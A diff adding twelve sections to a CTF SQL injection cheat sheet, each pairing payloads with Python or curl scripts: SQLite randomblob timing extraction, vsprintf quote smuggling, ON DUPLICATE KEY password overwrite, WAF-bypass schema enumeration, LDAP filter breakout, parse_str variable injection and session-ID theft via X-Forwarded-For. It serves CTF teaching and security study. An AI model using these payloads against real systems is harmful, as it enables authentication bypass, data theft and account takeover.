@@ -20,6 +20,18 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
 - [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
 - [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
+- [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
+- [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
+- [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
+- [MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)](#mysql-innodb_table_stats-as-information_schema-alternative-n1ctf-2018)
+- [SQLi Inline Comment Multi-Field Split (picoCTF 2018)](#sqli-inline-comment-multi-field-split-picoctf-2018)
+- [PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)](#php-full-width-dollar-regex-anchor-bypass-hacklu-ctf-2018)
+- [MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)](#mysql-regexp-byte-by-byte-oracle--backtick-comment-bypass-bsides-delhi-2018)
+- [LDAP Filter Breakout with Wildcard Injection (CSAW 2018)](#ldap-filter-breakout-with-wildcard-injection-csaw-2018)
+- [ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)](#expressionengine-filemanager-order-by-sort-key-sqli-35c3-2018)
+- [PHP parse_str() Variable Injection (TokyoWesterns 2018)](#php-parse_str-variable-injection-tokyowesterns-2018)
+- [SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)](#sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019)
+- [Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)](#quote-adjacent-union-keyword-filter-bypass-tamuctf-2019)
 
 ---
 
@@ -399,5 +411,380 @@ Referer              # logged for referral tracking
 ```
 
 **Key insight:** `PROCEDURE ANALYSE()` is a MySQL-specific alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
+
+---
+
+## SQLite Blind SQLi via randomblob() Timing (SECCON 2017)
+
+**Pattern:** SQLite has no `SLEEP()` function. Use `randomblob(N)` as a time-based blind injection primitive -- generating a large random blob creates a measurable delay proportional to the argument size.
+
+```sql
+-- Basic time-based blind test: if the condition is true, randomblob() introduces delay
+admin' and 1=randomblob(300000000)--
+
+-- Character-by-character password extraction via LIKE:
+admin' and password like 'f%' and 1=randomblob(300000000)--
+admin' and password like 'fl%' and 1=randomblob(300000000)--
+admin' and password like 'fla%' and 1=randomblob(300000000)--
+admin' and password like 'flag%' and 1=randomblob(300000000)--
+```
+
+```python
+import requests
+import time
+import string
+
+url = "http://target/login"
+known = ""
+
+for pos in range(32):
+    for c in string.ascii_lowercase + string.digits + "_{}":
+        payload = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
+        start = time.time()
+        requests.post(url, data={"username": payload, "password": "x"})
+        elapsed = time.time() - start
+        if elapsed > 2.0:  # threshold: randomblob(300M) takes ~2-3 seconds
+            known += c
+            print(f"Found: {known}")
+            break
+```
+
+**Key insight:** `randomblob()` generates random data proportional to the argument size, creating measurable delays. This is the SQLite equivalent of MySQL's `SLEEP()` or PostgreSQL's `pg_sleep()`. Adjust the argument (e.g., `300000000`) based on server performance to get a reliable timing difference. Other SQLite delay alternatives include `zeroblob()` and recursive CTEs, but `randomblob()` is the most reliable.
+
+---
+
+## vsprintf Double-Prepare Format String SQLi (AceBear 2018)
+
+**Pattern:** When user input passes through `vsprintf()` twice (once for formatting, once for query building), format specifiers like `%1$c` in the first pass produce characters that bypass string-level escaping. The integer `39` converts to ASCII `'` (single quote) via `%c`, defeating `mysqli_real_escape_string`.
+
+```text
+# Attack parameters:
+username=39&password=%1$c+or+1=1--+-
+
+# Server-side processing:
+# 1. Input is escaped: mysqli_real_escape_string has nothing to escape in "39" or "%1$c or 1=1-- -"
+# 2. vsprintf processes the query template:
+#    vsprintf("SELECT * FROM users WHERE user='%1$c or 1=1-- -' AND pass='%s'", [39, ...])
+# 3. %1$c converts argument 39 → chr(39) → ' (single quote)
+# 4. Result: WHERE user='' or 1=1-- -' AND pass='...'
+#    → authentication bypass
+```
+
+```python
+import requests
+
+# Step 1: Bypass login
+r = requests.post("http://target/login", data={
+    "username": "39",
+    "password": "%1$c or 1=1-- -"
+})
+
+# Step 2: Extract data with UNION
+r = requests.post("http://target/login", data={
+    "username": "39",
+    "password": "%1$c union select 1,group_concat(flag),3 from flags-- -"
+})
+```
+
+**Key insight:** `%c` in `vsprintf` converts an integer to a character, bypassing string-level escaping. If user input passes through `vsprintf` twice (once for formatting, once for query building), format specifiers in the first input become SQL injection vectors in the second pass. The key trick is sending `39` as one parameter (ASCII code for single quote) and `%1$c` as another to reference that parameter as a character. Look for PHP code that chains `sprintf`/`vsprintf` with query construction.
+
+---
+
+### SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)
+
+**Pattern:** When you can inject into an INSERT statement but SELECT is revoked, use MySQL's `ON DUPLICATE KEY UPDATE` clause to overwrite an existing user's password. The clause triggers when the INSERT would violate a UNIQUE constraint, updating the existing row instead.
+
+```sql
+-- Vulnerable INSERT:
+INSERT INTO users (id, username, password) VALUES ('', 'USER_INPUT', 'PASS_INPUT')
+
+-- Injection in username field:
+'),('','root','z')ON DUPLICATE KEY UPDATE password='l'#
+
+-- Resulting query:
+INSERT INTO users (id, username, password) VALUES ('', ''),('','root','z')ON DUPLICATE KEY UPDATE password='l'#', 'PASS_INPUT')
+-- This inserts a row for 'root' and when the UNIQUE constraint on username conflicts,
+-- it updates the existing root user's password to 'l'
+```
+
+```python
+import requests
+
+# Overwrite the root user's password via ON DUPLICATE KEY UPDATE
+payload_username = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
+r = requests.post("http://target/register", data={
+    "username": payload_username,
+    "password": "anything"
+})
+
+# Now login as root with the overwritten password
+r = requests.post("http://target/login", data={
+    "username": "root",
+    "password": "hacked"
+})
+print(r.text)
+```
+
+**Key insight:** MySQL's `ON DUPLICATE KEY UPDATE` clause in INSERT statements can modify existing rows when a UNIQUE constraint conflicts, enabling password overwrite without SELECT privileges. This is particularly useful when the database user has INSERT but not SELECT permissions, making traditional UNION-based extraction impossible. Look for registration or user creation endpoints with injectable INSERT queries.
+
+---
+
+### MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)
+
+**Pattern:** When a WAF blocks access to `information_schema`, use `mysql.innodb_table_stats` to enumerate database and table names. This system table contains metadata about InnoDB tables and is often not included in WAF rules.
+
+```sql
+-- Direct query (if not blind):
+SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
+
+-- Also available:
+SELECT group_concat(database_name) FROM mysql.innodb_table_stats
+```
+
+```python
+# Boolean-based blind extraction via innodb_table_stats:
+import requests
+import string
+
+def blind_extract(url):
+    result = ""
+    for pos in range(1, 100):
+        found = False
+        for char in string.ascii_lowercase + string.digits + "_,":
+            payload = (
+                "'or(if(1,(select(substr((select(group_concat(table_name))"
+                f" from mysql.innodb_table_stats where database_name=database()),{pos},1))"
+                f"='{char}'),1)=1)#"
+            )
+            r = requests.post(url, data={"input": payload})
+            if "success" in r.text:  # adjust oracle condition
+                result += char
+                found = True
+                print(f"[+] Extracted so far: {result}")
+                break
+        if not found:
+            break
+    return result
+
+tables = blind_extract("http://target/search")
+print(f"Tables: {tables}")
+```
+
+**Other WAF-bypass metadata sources:**
+```sql
+-- mysql.innodb_table_stats: database_name, table_name
+-- mysql.innodb_index_stats: database_name, table_name, index_name
+-- sys.schema_table_statistics: table_schema, table_name (MySQL 5.7+)
+-- sys.x$schema_table_statistics: same, less formatting
+```
+
+**Key insight:** `mysql.innodb_table_stats` contains `database_name` and `table_name` columns, providing an alternative metadata source when `information_schema` access is filtered by WAF rules. Unlike `information_schema`, it only tracks InnoDB tables (not column names), so combine with error-based or blind techniques to discover column names after finding tables.
+
+---
+
+## SQLi Inline Comment Multi-Field Split (picoCTF 2018)
+
+**Pattern:** A regex filter checks the username field but leaves the password field unfiltered. Start a MySQL inline comment `/*` in username and close it `*/` in password, splitting the injection across two fields so no single field triggers the filter alone.
+
+```text
+# Vulnerable query (after PHP concatenation):
+SELECT * FROM users WHERE name='<username>' AND password='<password>'
+
+# Payload:
+username = '/*
+password = */ OR 1=1 --
+
+# Final query MySQL sees:
+SELECT * FROM users WHERE name='/*' AND password='*/ OR 1=1 -- '
+# After comment removal:
+SELECT * FROM users WHERE name=' OR 1=1 -- '
+```
+
+```python
+import requests
+r = requests.post("http://target/login", data={
+    "username": "'/*",
+    "password": "*/ OR 1=1 -- "
+})
+```
+
+**Key insight:** MySQL `/* ... */` comments span across string delimiters and field boundaries when the filter runs before interpolation, not after. Any validator that checks one field at a time misses the full injected string. When a blocklist hits the username regex but the password field is rendered into the same query, split payloads across both inputs.
+
+**References:** picoCTF 2018 — THE VAULT, writeup 11747
+
+---
+
+## PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)
+
+**Pattern:** PHP regex `/^\d+＄/` uses the Unicode full-width dollar sign (`＄`, U+FF04) instead of ASCII `$`. PCRE treats the full-width character as a literal, so there is no end-of-string anchor and the match succeeds even with trailing garbage.
+
+```php
+// Vulnerable check
+if (preg_match('/^\d+＄/', $input)) { /* accepted */ }
+
+// Payload passes validation and later triggers long-string handling
+$_GET['key2'] = '1337＄' . str_repeat('a', 50);
+```
+
+```bash
+curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
+```
+
+**Key insight:** Always compare regex special characters by codepoint, not by appearance. Unicode look-alikes of `$`, `^`, `.`, `[`, `]`, `*`, `+`, `?`, `(`, `)` are literals in PCRE and silently downgrade the pattern. Check every anchor in a filter with `hexdump -C` before trusting it.
+
+**References:** Hack.lu CTF 2018 — Baby PHP, writeup 11846
+
+---
+
+## MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)
+
+**Pattern:** WAF blocks `|`, `-`, `\`, `#`, `and`, `if`, `where`, `concat`, `insert`, `having`, and `sleep`, but leaves `REGEXP` and backtick identifiers alone. Use backtick-delimited comments `/**/` as space replacement and `REGEXP` as a Boolean oracle that matches an anchored prefix character-by-character. A trailing null byte terminates the query in old PHP/MySQL pairs and drops the surrounding single-quote.
+
+```text
+# Blacklist (partial): | - \ ( ) # and if database where concat insert having sleep
+
+# Oracle query:
+/?user=`\`&pw=`||pw/**/REGEXP/**/%22^1%22;%00
+
+# Iteratively extend the regex prefix:
+^1 → ^17 → ^172 → ^1729 ...
+```
+
+```python
+import requests, string
+URL = "http://target/"
+prefix = ""
+charset = string.ascii_letters + string.digits + "{}_"
+while True:
+    for c in charset:
+        pw = f"`||pw/**/REGEXP/**/\"^{prefix+c}\";\x00"
+        r = requests.get(URL, params={"user": "`\\`", "pw": pw})
+        if "Welcome" in r.text:
+            prefix += c
+            print(prefix)
+            break
+    else:
+        break
+```
+
+**Key insight:** `REGEXP` is rarely on a WAF keyword list and supports anchors (`^`, `$`) and character classes, giving a full byte-by-byte oracle without `AND`, `IF`, or `SUBSTRING`. Backticked column references bypass space stripping because `/**/` comments separate tokens without spaces. Null bytes after the payload truncate the SQL string early in MySQL clients that still honor embedded NULs.
+
+**References:** BSides Delhi CTF 2018 — Old School SQL, writeup 11953
+
+---
+
+## LDAP Filter Breakout with Wildcard Injection (CSAW 2018)
+
+**Pattern:** An LDAP search filter `(&(GivenName=<input>)(!(GivenName=Flag)))` interpolates user input without escaping parentheses or wildcards. Inject `*))(|(uid=*` to close the first clause, open a disjunction, and match every entry — including the blocked `Flag` account.
+
+```text
+# Original filter
+(&(GivenName=Alice)(!(GivenName=Flag)))
+
+# Injected input: *))(|(uid=*
+# Resulting filter
+(&(GivenName=*))(|(uid=*)(!(GivenName=Flag)))
+
+# The `&` now only sees (GivenName=*), and the trailing disjunction + leftover
+# negation become ignored extra filter components.
+```
+
+```python
+import requests
+r = requests.get("http://target/search", params={"name": "*))(|(uid=*"})
+print(r.text)
+```
+
+**Key insight:** LDAP filters use a prefix-notation boolean tree: `&` / `|` / `!` followed by parenthesised children. Unescaped user input that contains `)`, `(`, `*`, or `\` lets the attacker rebalance that tree. Common payloads: `*)(uid=*` (OR wildcard), `*))(&(1=1)` (force true), `foo)(|(password=*)`  (enumerate records). Escape with `\28`, `\29`, `\2a`, `\5c` on the server side.
+
+**References:** CSAW CTF Qualification Round 2018 — ldab, writeup 11207
+
+---
+
+## PHP parse_str() Variable Injection (TokyoWesterns 2018)
+
+**Pattern:** PHP's `parse_str($str)` — called without a result array — writes every key in the query string as a local variable in the current scope. Attacker-controlled keys overwrite authentication variables such as `$hashed_password` that the script compares against a precomputed hash.
+
+```php
+// Vulnerable
+parse_str($_SERVER['QUERY_STRING']);  // $hashed_password ← attacker input
+if (md5($password) === $hashed_password) { login(); }
+
+// Safe form
+parse_str($_SERVER['QUERY_STRING'], $params);
+```
+
+```bash
+# Set the target variable directly from the query string
+curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php -r 'echo md5("anything");')"
+```
+
+**Key insight:** `parse_str()` and `extract()` are register_globals-style primitives: any parameter sent by the client becomes a PHP variable that might shadow logic the developer assumed was local. The fix is always the two-argument form. When auditing PHP, grep for `parse_str\(\s*\$[^,]*\)` with no comma.
+
+**References:** TokyoWesterns CTF 4th 2018 — SimpleAuth, writeup 11034
+
+---
+
+## ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)
+
+**Pattern:** ExpressionEngine's file-manager endpoint takes a `tbl_sort` array from the client and passes each `[column, direction]` pair directly to `$db->order_by($key, $val)`. Column names are concatenated into SQL with no allowlist, so the attacker controls an `ORDER BY` expression.
+
+```http
+POST /cp/tbl_sort[0][]=(select if(substr(user_password,1,1)='a',sleep(5),0) from exp_members) tbl_sort[0][]=ASC
+```
+
+Use `sleep()` / `benchmark()` inside the sort expression to run a blind timing oracle on the admin password hash.
+
+**Key insight:** Any ORM that lets the client pick sort columns must allowlist them. The attack is particularly nasty because `ORDER BY` subqueries are rarely caught by WAFs that focus on `SELECT`/`UNION` keywords.
+
+**References:** 35C3 CTF 2018 — ExpressionEngine filemanager SQLi, writeup 12880
+
+---
+
+## SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)
+
+**Pattern:** A session initializer builds `SELECT ... FROM nxf8_sessions WHERE ip_address = '<X-Forwarded-For>'` and copies the resulting row into the `PHPSESSID` cookie. The value of the last column of your UNION row becomes the cookie — a free one-shot exfiltration channel. The error message `unrecognized token` reveals SQLite; enumerate with `sqlite_master`.
+
+```bash
+# Discover column count (4 columns in this table)
+curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,null from nxf8_users where '1'='1"
+
+# Leak table definitions from sqlite_master
+curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='nxf8_users' and type='table"
+
+# Exfiltrate a specific row (session_id for user 5)
+curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
+# -> Set-Cookie: PHPSESSID=<leaked value>
+```
+Pad with `null` columns until the UNION fits; place the target expression in the column whose value is reflected in the cookie. Reuse the leaked `session_id` as your own `PHPSESSID` to impersonate the target user (e.g., Maria).
+
+**Key insight:** Session-ID generation logic often includes unsanitized HTTP headers (`X-Forwarded-For`, `Client-IP`, `True-Client-IP`). The reflected row becomes a free oracle: no error-based or time-based inference required. SQLite-specific UNION uses `null` padding and `sqlite_master(type,name,tbl_name,sql)` for schema enumeration (no `information_schema`).
+
+**References:** Quals Saudi and Oman National Cyber Security CTF 2019 — Maria, writeup 13236
+
+---
+
+## Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)
+
+**Pattern:** Application blocks the word `UNION` but naively looks for `" UNION "` (space-delimited). The SQL lexer treats a closing quote as a token boundary, so `'UNION` is still parsed as the keyword `UNION` after the string literal closes. Placing `UNION` flush against the closing quote slips past the string filter while the parser still accepts it.
+
+```sql
+-- Original: SELECT items FROM Search WHERE items='<input>';
+-- Blocked (filter sees " UNION "):
+aggies' UNION SELECT 1; #
+
+-- Bypass (no space before UNION — filter sees "UNION" embedded in word "aggies'UNION"):
+aggies'UNION SELECT 1; #
+
+-- Drop the string prefix entirely:
+'UNION SELECT @@VERSION #
+'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema!='information_schema' #
+'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema!='information_schema' #
+'UNION ALL SELECT grantee FROM information_schema.user_privileges #
+```
+
+**Key insight:** Naive blacklists look for whitespace-delimited keywords, but SQL lexers tolerate quote-adjacent tokens — the closing `'` is implicit whitespace to the parser. The same trick works for `/*!50000UNION*/`, tab/newline (`%09`, `%0a`), parentheses (`UNION(SELECT...)`), and comment blocks (`UNION/**/SELECT`). Also probe `information_schema.user_privileges` for the `grantee` column — CTF authors often hide flags as the privileged user's name.
+
+**References:** TAMUctf 2019 — Bird Box Challenge, writeup 13860
 
 ---
